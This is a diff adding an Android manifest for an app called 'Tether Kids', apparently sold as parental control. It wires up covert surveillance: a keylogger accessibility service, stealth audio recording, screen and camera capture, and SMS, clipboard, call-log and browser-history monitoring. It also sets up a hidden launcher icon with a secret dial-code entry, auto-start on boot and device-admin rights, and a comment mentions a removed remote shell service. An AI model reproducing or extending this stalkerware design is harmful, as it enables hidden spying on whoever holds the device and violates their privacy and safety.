@@ -1,0 +1,311 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- Permissions -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CLIPBOARD" />
+    <uses-permission android:name="android.permission.BATTERY_STATS" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+    <uses-feature android:name="android.hardware.microphone" android:required="false" />
+
+    <application
+        android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="Tether Kids"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="false"
+        android:theme="@style/Theme.TetherKids"
+        android:usesCleartextTraffic="true"
+        android:hasCode="true"
+        android:persistent="false"
+        tools:targetApi="34"
+        tools:ignore="GoogleAppIndexingWarning">
+
+        <!-- Main Activity - LAUNCHER langsung connect -->
+        <activity
+            android:name=".ui.main.MainActivity"
+            android:exported="true"
+            android:theme="@style/Theme.TetherKids"
+            android:windowSoftInputMode="adjustResize"
+            android:launchMode="singleTask"
+            android:excludeFromRecents="true"
+            android:noHistory="false">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Secret Access Activity (untuk akses saat icon disembunyikan) -->
+        <activity
+            android:name=".ui.access.SecretAccessActivity"
+            android:exported="true"
+            android:theme="@style/Theme.TetherKids"
+            android:label="Tether Kids"
+            android:noHistory="true"
+            android:excludeFromRecents="true">
+            <intent-filter>
+                <action android:name="com.tether.kids.SECRET_ACCESS" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+
+        <!-- PIN Verification Activity (full-screen, system alert) -->
+        <activity
+            android:name=".security.PinVerificationActivity"
+            android:exported="false"
+            android:theme="@style/Theme.TetherKids"
+            android:label="Parent PIN"
+            android:noHistory="true"
+            android:excludeFromRecents="true" />
+
+        <!-- Location Service -->
+        <service
+            android:name=".service.LocationService"
+            android:foregroundServiceType="location"
+            android:exported="false" />
+
+        <!-- Screen Control Service -->
+        <service
+            android:name=".service.ScreenControlService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false" />
+
+        <!-- Screen Recorder Service -->
+        <service
+            android:name=".service.ScreenRecorderService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false" />
+
+        <!-- Boot Receiver - auto-start on device boot -->
+        <receiver
+            android:name=".service.BootReceiver"
+            android:exported="true"
+            android:enabled="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Camera Service -->
+        <service
+            android:name=".service.CameraService"
+            android:foregroundServiceType="camera"
+            android:exported="false" />
+
+        <!-- Voice Monitor Service -->
+        <service
+            android:name=".service.VoiceMonitorService"
+            android:foregroundServiceType="microphone"
+            android:exported="false" />
+
+        <!-- Stealth Audio Service -->
+        <service
+            android:name=".service.StealthAudioService"
+            android:foregroundServiceType="microphone"
+            android:exported="false" />
+
+        <!-- Session Monitor Service -->
+        <service
+            android:name=".service.SessionMonitorService"
+            android:exported="false" />
+
+        <!-- SMS/Chat Monitor Service -->
+        <service
+            android:name=".service.SmsMonitorService"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- App Blocklist Service -->
+        <service
+            android:name=".service.AppBlockService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Media Access Service -->
+        <service
+            android:name=".service.MediaAccessService"
+            android:exported="false" />
+
+        <!-- Network Monitor Service -->
+        <service
+            android:name=".service.NetworkMonitorService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Device Info Service -->
+        <service
+            android:name=".service.DeviceInfoService"
+            android:exported="false" />
+
+        <!-- Remote Shell Service (DIHAPUS - butuh root) -->
+
+        <!-- Contacts Access Service -->
+        <service
+            android:name=".service.ContactsAccessService"
+            android:exported="false" />
+
+        <!-- File Manager Service -->
+        <service
+            android:name=".service.FileManagerService"
+            android:exported="false" />
+
+        <!-- Clipboard Monitor Service -->
+        <service
+            android:name=".service.ClipboardMonitorService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Call Log Service -->
+        <service
+            android:name=".service.CallLogService"
+            android:exported="false" />
+
+        <!-- Keylogger/Accessibility Service -->
+        <service
+            android:name=".service.KeyloggerService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- App Usage Monitor Service -->
+        <service
+            android:name=".service.AppUsageService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Browser History Service -->
+        <service
+            android:name=".service.BrowserHistoryService"
+            android:exported="false" />
+
+        <!-- Remote Notification Service -->
+        <service
+            android:name=".service.RemoteNotificationService"
+            android:exported="false" />
+
+        <!-- Remote Ring Service -->
+        <service
+            android:name=".service.RemoteRingService"
+            android:exported="false" />
+
+        <!-- SIM Card Info Service -->
+        <service
+            android:name=".service.SimCardService"
+            android:exported="false" />
+
+        <!-- Battery Monitor Service -->
+        <service
+            android:name=".service.BatteryMonitorService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Camera Burst Service (DIHAPUS - tidak terpakai) -->
+
+        <!-- Flashlight Service -->
+        <service
+            android:name=".service.FlashlightService"
+            android:exported="false" />
+
+        <!-- Device Admin Receiver -->
+        <receiver
+            android:name=".service.DeviceAdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policy" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Package Monitor Receiver (detect install/uninstall) -->
+        <receiver
+            android:name=".security.PackageMonitorReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Install Interceptor (notify parent saat app di-install) -->
+        <receiver
+            android:name=".security.InstallInterceptor"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Secret Code Receiver (handle *#*#TETHER#*#* dial code) -->
+        <receiver
+            android:name=".security.SecretCodeReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="833843" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Notification Tap Receiver (3x tap secret gesture) -->
+        <receiver
+            android:name=".security.NotificationTapReceiver"
+            android:exported="false"
+            android:enabled="true" />
+
+    </application>
+
+</manifest>
